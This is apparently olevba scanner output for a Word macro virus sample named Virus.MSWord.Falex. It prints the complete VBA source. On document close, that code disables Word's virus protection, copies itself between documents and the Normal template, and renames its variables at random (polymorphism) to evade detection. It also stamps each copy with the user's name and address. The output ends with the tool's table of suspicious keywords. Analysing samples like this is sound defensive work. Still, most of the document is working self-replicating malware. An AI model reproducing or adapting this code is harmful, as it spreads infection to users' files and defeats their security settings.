olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Falex-f33db6681502b4a96eea0663356b684fc4f5f7ad
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Falex-f33db6681502b4a96eea0663356b684fc4f5f7ad - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

On Error Resume Next

Const Truex = True, Falsex = False, Zero = 0, One = 1, wdFormatDocumentx = wdFormatDocument, wdFormatTemplatex = wdFormatTemplate, DoubleDot = ":"

Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim activedoc, normaltmp As Object
Dim ActiveDocName, OurCode As String

Set activedoc = ActiveDocument.VBProject.VBComponents.Item(One)
Set normaltmp = NormalTemplate.VBProject.VBComponents.Item(One)


DocumentInfected = Falsex
NormalTemplateInfected = Falsex

If activedoc.CodeModule.CountOfLines <> Zero Then DocumentInfected = Truex
If normaltmp.CodeModule.CountOfLines <> Zero Then NormalTemplateInfected = Truex

Options.VirusProtection = Falsex

If (DocumentInfected = Truex Xor NormalTemplateInfected = Truex) And (ActiveDocument.SaveFormat = wdFormatDocumentx Or ActiveDocument.SaveFormat = wdFormatTemplatex) Then
   
  If DocumentInfected = Truex Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = activedoc.CodeModule.Lines(One, activedoc.CodeModule.CountOfLines)
    
    Call AppendLog(OurCode)
    Call PolyIt(OurCode)

    normaltmp.CodeModule.InsertLines One, OurCode
    
    If SaveNormalTemplate = Truex Then NormalTemplate.Save
    
  End If


  ActiveDocName = Mid(ActiveDocument.FullName, 2, One)
  If NormalTemplateInfected = Truex And (ActiveDocName = DoubleDot Or ActiveDocument.Saved = Falsex) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = normaltmp.CodeModule.Lines(1, normaltmp.CodeModule.CountOfLines)
    
    activedoc.CodeModule.InsertLines One, OurCode
    
    If SaveDocument = Truex Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub


Private Sub PolyIt(ByRef OurCode As String)

On Error Resume Next

Const PolyItVarCount = 16, VarCount = PolyItVarCount + 23, UpperLimit = 15, LowerLimit = 5, AsciiA = 65, AsciiZ = 90, One = 1

Dim Variable(One To VarCount), Variable2(One To VarCount), NewCode As String
Dim CounterI, CounterJ, CounterK As Integer
Dim Changed As Boolean

Variable(1) = "OurCode"
Variable(2) = "VarCount"
Variable(3) = "Variable"
Variable(4) = "Variable2"
Variable(5) = "NewCode"
Variable(6) = "CounterI"
Variable(7) = "CounterJ"
Variable(8) = "CounterK"
Variable(9) = "Changed"
Variable(10) = "PolyIt"
Variable(11) = "PolyItVarCount"
Variable(12) = "UpperLimit"
Variable(13) = "LowerLimit"
Variable(14) = "AsciiA"
Variable(15) = "AsciiZ"
Variable(16) = "One"

Variable(PolyItVarCount + 1) = "SaveDocument"
Variable(PolyItVarCount + 2) = "SaveNormalTemplate"
Variable(PolyItVarCount + 3) = "DocumentInfected"
Variable(PolyItVarCount + 4) = "NormalTemplateInfected"
Variable(PolyItVarCount + 5) = "activedoc"
Variable(PolyItVarCount + 6) = "normaltmp"
Variable(PolyItVarCount + 7) = "AppendLog"
Variable(PolyItVarCount + 8) = "UserAddy"
Variable(PolyItVarCount + 9) = "Chr13"
Variable(PolyItVarCount + 10) = "Chr10"
Variable(PolyItVarCount + 11) = "Comment"
Variable(PolyItVarCount + 12) = "UserAddyTmp"
Variable(PolyItVarCount + 13) = "UserNameTmp"
Variable(PolyItVarCount + 14) = "TimeDate"
Variable(PolyItVarCount + 15) = "ActiveDocName"
Variable(PolyItVarCount + 16) = "Truex"
Variable(PolyItVarCount + 17) = "Falsex"
Variable(PolyItVarCount + 18) = "Zero"
Variable(PolyItVarCount + 19) = "wdFormatDocumentx"
Variable(PolyItVarCount + 20) = "wdFormatTemplatex"
Variable(PolyItVarCount + 21) = "TimeFormat"
Variable(PolyItVarCount + 22) = "DateFormat"
Variable(PolyItVarCount + 23) = "DoubleDot"

Randomize

For CounterI = One To VarCount
  For CounterJ = One To Int((UpperLimit - LowerLimit + One) * Rnd + LowerLimit)
    Variable2(CounterI) = Variable2(CounterI) & Chr(Int((AsciiZ - AsciiA + 1) * Rnd + AsciiA))
  Next CounterJ
Next CounterI

Changed = False
For CounterI = One To Len(OurCode)

  For CounterJ = One To VarCount
  
    If Mid(OurCode, CounterI, Len(Variable(CounterJ))) = Variable(CounterJ) Then
      NewCode = NewCode & Variable2(CounterJ)
      CounterI = CounterI + Len(Variable(CounterJ)) - One
      Changed = True
      Exit For
    End If
    
  Next CounterJ
  
  If Changed = False Then
    NewCode = NewCode & Mid(OurCode, CounterI, One)
  Else
    Changed = False
  End If
  
Next CounterI

OurCode = NewCode

End Sub


Private Sub AppendLog(ByRef OurCode As String)

On Error Resume Next

Const Comment = "' "
Const TimeFormat = "hh:mm:ss: AMPM - ", DateFormat = "dddd, d mmm yyyy"

Dim UserAddyTmp, UserAddy, UserNameTmp, TimeDate, Chr13, Chr10 As String
Dim CounterI As Integer

    Chr13 = Chr(13)
    UserAddy = Application.UserAddress
    TimeDate = Format(Time, TimeFormat) & Format(Date, DateFormat)
    Chr10 = Chr(10)
    UserNameTmp = Application.UserName
    
    For i = 1 To Len(UserAddy)
      If Mid(UserAddy, CounterI, 1) <> Chr13 Then
        If Mid(UserAddy, CounterI, 1) <> Chr10 Then
          UserAddyTmp = UserAddyTmp & Mid(UserAddy, CounterI, 1)
        End If
      Else
        UserAddyTmp = UserAddyTmp & Chr13 & Comment
      End If
    Next i

    OurCode = OurCode & Chr13 & Comment & TimeDate & Chr13 & Comment & UserNameTmp & Chr13 & Comment & UserAddy & Chr13
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

